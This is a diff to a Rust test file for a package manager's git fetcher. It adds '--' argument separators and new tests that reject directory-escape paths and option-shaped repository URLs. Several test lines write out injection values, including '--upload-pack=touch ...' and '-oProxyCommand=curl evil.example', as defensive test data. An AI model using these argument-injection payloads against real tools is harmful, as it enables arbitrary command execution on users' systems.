@@ -1,8 +1,11 @@
 use super::{
-    GitFetcher, GitManifestQuery, exec_git_with, extract_host, is_valid_commit_hash,
-    read_git_manifest, should_use_shallow,
+    GitFetcher, GitManifestQuery, exec_git_with, extract_host, is_safe_repo_arg,
+    is_valid_commit_hash, read_git_manifest, should_use_shallow,
 };
-use crate::{error::GitFetcherError, prepare_package::AllowBuildRef};
+use crate::{
+    error::{GitFetcherError, PreparePackageError},
+    prepare_package::AllowBuildRef,
+};
 use pacquet_executor::ScriptsPrependNodePath;
 use pacquet_reporter::SilentReporter;
 use pacquet_store_dir::StoreDir;
@@ -948,9 +951,9 @@ async fn fetcher_uses_shallow_fetch_for_allowed_hosts() {
     // strict-ordering asserts catch.
     let init_at = position_of(&invocations, &["init"])
         .unwrap_or_else(|| panic!("shallow path must call `git init`; got {invocations:?}"));
-    let remote_at = position_of(&invocations, &["remote", "add", "origin", repo_url])
+    let remote_at = position_of(&invocations, &["remote", "add", "origin", "--", repo_url])
         .unwrap_or_else(|| {
-            panic!("shallow path must call `git remote add origin <url>`; got {invocations:?}")
+            panic!("shallow path must call `git remote add origin -- <url>`; got {invocations:?}")
         });
     let fetch_at = position_of(&invocations, &["fetch", "--depth", "1", "origin", fake_commit])
         .unwrap_or_else(|| {
@@ -1023,13 +1026,14 @@ async fn fetcher_clones_when_host_not_in_shallow_list() {
     .unwrap();
 
     let invocations = parse_shim_log(&log_path);
-    // `git clone <repo_url> <some_path>` — we accept any temp-dir
-    // path argument, but pin the leading three argv slots.
+    // `git clone -- <repo_url> <some_path>` — we accept any temp-dir
+    // path argument, but pin the leading argv slots. The `--` keeps a
+    // `-`-leading repo out of git's option parser.
     assert!(
-        invocations
-            .iter()
-            .any(|args| { args.len() >= 3 && args[0] == "clone" && args[1] == repo_url }),
-        "non-shallow path must call `git clone <url> <dir>`; got {invocations:?}",
+        invocations.iter().any(|args| {
+            args.len() >= 4 && args[0] == "clone" && args[1] == "--" && args[2] == repo_url
+        }),
+        "non-shallow path must call `git clone -- <url> <dir>`; got {invocations:?}",
     );
     // The shallow argv must be absent — guards the gate's polarity.
     // All three commands the shallow branch issues must be missing,
@@ -1038,7 +1042,7 @@ async fn fetcher_clones_when_host_not_in_shallow_list() {
     // still pass the positive assertion above.
     for verboten in [
         &["init"][..],
-        &["remote", "add", "origin", repo_url],
+        &["remote", "add", "origin", "--", repo_url],
         &["fetch", "--depth", "1", "origin", fake_commit],
     ] {
         assert!(
@@ -1136,4 +1140,68 @@ async fn read_git_manifest_rejects_a_non_sha_commit() {
     .expect_err("a non-SHA commit must be rejected before it reaches git");
 
     assert!(matches!(err, GitFetcherError::InvalidCommit { .. }), "{err:?}");
+}
+
+/// A `path` that climbs out of the checkout must not reach
+/// `safe_read_package_json_from_dir`, which would read an arbitrary
+/// `package.json` off the host and stamp its name onto this dep.
+#[tokio::test(flavor = "multi_thread")]
+async fn read_git_manifest_rejects_a_sub_directory_escape() {
+    let tmp = tempdir().unwrap();
+    let (bare, commit) = make_bare_repo(tmp.path());
+    let repo = format!("file://{}", bare.to_string_lossy());
+    // A real `package.json` sitting outside the checkout, of the shape
+    // an escape would be aiming for.
+    fs::write(tmp.path().join("package.json"), r#"{"name":"outside","version":"9.9.9"}"#).unwrap();
+
+    for escape in ["/../..", "../..", "/../"] {
+        let err = read_git_manifest(GitManifestQuery {
+            repo: &repo,
+            commit: &commit,
+            path: Some(escape),
+            git_shallow_hosts: &[],
+            git_bin: None,
+        })
+        .await
+        .expect_err("a path climbing out of the checkout must be rejected");
+        assert!(
+            matches!(err, GitFetcherError::Prepare(PreparePackageError::InvalidPath { .. })),
+            "{escape:?} produced {err:?}",
+        );
+    }
+}
+
+/// A repo beginning with `-` is read by git as an option, not a URL:
+/// `--upload-pack=<cmd>` runs `<cmd>` on a local or SSH transport. Both
+/// passes reach `checkout_commit`, so both are guarded.
+#[tokio::test(flavor = "multi_thread")]
+async fn read_git_manifest_rejects_an_option_shaped_repo() {
+    let tmp = tempdir().unwrap();
+    let marker = tmp.path().join("pwned.txt");
+    let payload = format!("--upload-pack=touch {}", marker.to_string_lossy());
+
+    let err = read_git_manifest(GitManifestQuery {
+        repo: &payload,
+        commit: "0123456789abcdef0123456789abcdef01234567",
+        path: None,
+        git_shallow_hosts: &[],
+        git_bin: None,
+    })
+    .await
+    .expect_err("an option-shaped repo must be rejected before it reaches git");
+
+    assert!(matches!(err, GitFetcherError::InvalidRepo { .. }), "{err:?}");
+    assert!(!marker.exists(), "the payload must never have run");
+}
+
+#[test]
+fn is_safe_repo_arg_rejects_option_shaped_values() {
+    assert!(is_safe_repo_arg("https://github.com/x/y.git"));
+    assert!(is_safe_repo_arg("file:///tmp/repo"));
+    assert!(is_safe_repo_arg("ssh://git@example.com/x/y.git"));
+
+    assert!(!is_safe_repo_arg("--upload-pack=touch /tmp/pwned"));
+    assert!(!is_safe_repo_arg("-oProxyCommand=curl evil.example"));
+    assert!(!is_safe_repo_arg(""));
+    assert!(!is_safe_repo_arg("https://example.com/\0/x"));
 }
